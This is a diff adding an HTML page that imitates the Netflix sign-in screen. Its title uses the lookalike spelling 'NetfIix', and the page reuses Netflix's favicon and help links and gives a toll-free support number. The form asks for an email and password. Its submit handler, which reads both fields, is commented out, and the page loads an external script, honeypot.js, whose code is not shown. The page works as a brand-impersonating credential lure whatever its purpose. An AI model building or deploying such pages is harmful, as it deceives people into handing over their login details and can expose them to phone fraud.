@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NetfIix - Watch TV Shows Online, Watch Movies Online</title>
+    <link rel="icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="background"></div>
+    
+    <header class="header">
+        <a href="/">
+            <img class="logo" src="logo.png" alt="Netflix">
+        </a>
+    </header>
+
+    <main class="main-content">
+        <div class="login-container">
+            <h1 class="login-title">Sign In</h1>
+            <form id="loginForm">
+                <div class="form-group">
+                   <input type="email" name="email" class="form-input" placeholder=" " required>
+                    <label class="form-label">Email or phone number</label>
+                </div>
+                <div class="form-group">
+                    <input type="password" name="password" class="form-input" placeholder=" " required>
+                    <label class="form-label">Password</label>
+                </div>
+                <button type="submit" class="login-button">Sign In</button>
+                <div style="margin: 12px 0; text-align: center;">
+                    <a href="/" class="help-link">Forgot password?</a>
+                </div>
+                <div class="remember-flex">
+                    <div class="remember-me">
+                        <input type="checkbox" id="remember" class="checkbox">
+                        <label for="remember"><strong>Remember me</strong></label>
+                    </div>
+                    <a href="/" class="help-link"><strong>Need help?</strong></a>
+                </div>
+                <div class="signup-now">
+                    <strong>New to Netflix?</strong><a href="/"><strong>Sign up now</strong></a>
+                </div>
+                <div class="recaptcha">
+                    <strong>This page is protected by Google reCAPTCHA to ensure you're not a bot.</strong> <br><br>
+                    <a href="#" id="learnMoreLink"><strong><u>Learn more</u></strong></a>
+                    <div id="learnMoreText" style="display:none; margin-top:10px;">
+                        <span>
+                            <strong>The information collected by Google reCAPTCHA is subject to the Google</strong>
+                            <a href="https://policies.google.com/privacy" id="recaptcha-privacy-link" data-uia="recaptcha-privacy-link" target="_blank"><strong>Privacy Policy</strong></a>
+                            <strong>and</strong>
+                            <a href="https://policies.google.com/terms" id="recaptcha-tos-link" data-uia="recaptcha-tos-link" target="_blank"><strong>Terms of Service</strong></a>,
+                            <strong>and is used for providing, maintaining, and improving the reCAPTCHA service and for general security purposes (it is not used for personalised advertising by Google).</strong>
+                        </span>
+                        <p class="default-ltr-cache-6j9385 euy28770" style="font-weight:bold;"><strong>Learn more.</strong></p>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content" style="max-width:1000px;margin:0 auto;padding:40px 0; color:#bababa;">
+                <span style="display:block;margin-bottom:24px;color:#bababa;font-size:16px;">
+                    Questions? Call <a href="tel:000-800-919-1743" style="color:#bababa;text-decoration:none;">000-800-919-1743 (Toll-Free)</a>
+                </span>
+                <ul class="footer-links-list" style="display:grid;grid-template-columns:repeat(4,1fr);gap:0 0;list-style:none;padding:0;margin:0 0 24px 0;">
+                    <li><a href="https://help.netflix.com/support/412" class="footer-link" style="color:#bababa;text-decoration:underline;">FAQ</a></li>
+                    <li><a href="https://help.netflix.com" class="footer-link" style="color:#bababa;text-decoration:underline;">Help Centre</a></li>
+                    <li><a href="https://help.netflix.com/legal/termsofuse" class="footer-link" style="color:#bababa;text-decoration:underline;">Terms of Use</a></li>
+                    <li><a href="https://help.netflix.com/legal/privacy" class="footer-link" style="color:#bababa;text-decoration:underline;">Privacy</a></li>
+                    <li><a href="#" class="footer-link" style="color:#bababa;text-decoration:underline;">Cookie Preferences</a></li>
+                    <li><a href="https://help.netflix.com/legal/corpinfo" class="footer-link" style="color:#bababa;text-decoration:underline;">Corporate Information</a></li>
+                </ul>
+                <div style="margin-top:24px;">
+                    <label for=":ra:" style="color:#bababa;font-size:13px;margin-right:8px;">Select language</label>
+                    <div style="display:inline-block;position:relative;">
+                        <select class="select_nativeElementStyles__1ewemfi0" dir="ltr" id=":ra:" name="LanguageSelect" style="background:#161616;color:#bababa;border:1px solid #737373;padding:6px 24px 6px 8px;border-radius:2px;appearance:none;">
+                            <option value="en-IN" label="English">English</option>
+                            <option value="hi-IN" label="हिन्दी">हिन्दी</option>
+                        </select>
+                        <span style="position:absolute;right:8px;top:50%;transform:translateY(-50%);pointer-events:none;">
+                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="16" height="16" data-icon="CaretDownSmall" aria-hidden="true">
+                                <path fill-rule="evenodd" clip-rule="evenodd" d="M11.5976 6.5C11.7461 6.5 11.8204 6.67956 11.7154 6.78457L8.23574 10.2643C8.10555 10.3945 7.89445 10.3945 7.76425 10.2643L4.28457 6.78457C4.17956 6.67956 4.25393 6.5 4.40244 6.5H11.5976Z" fill="currentColor"></path>
+                            </svg>
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        
+        //    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        //     e.preventDefault();
+        //     const email = document.querySelector('input[type="email"]').value;
+        //     const password = document.querySelector('input[type="password"]').value;
+        // });
+        
+
+        const inputs = document.querySelectorAll('.form-input');
+        inputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                this.parentElement.classList.add('focused');
+            });
+            
+            input.addEventListener('blur', function() {
+                if (!this.value) {
+                    this.parentElement.classList.remove('focused');
+                }
+            });
+        });
+
+        // Expand irreversible "Learn more" text
+        document.getElementById('learnMoreLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            var info = document.getElementById('learnMoreText');
+            if (info.style.display === 'none') {
+                info.style.display = 'block';
+                this.style.display = 'none';
+            }
+        });
+    </script>
+    <script src="honeypot.js"></script>
+</body>
+</html>
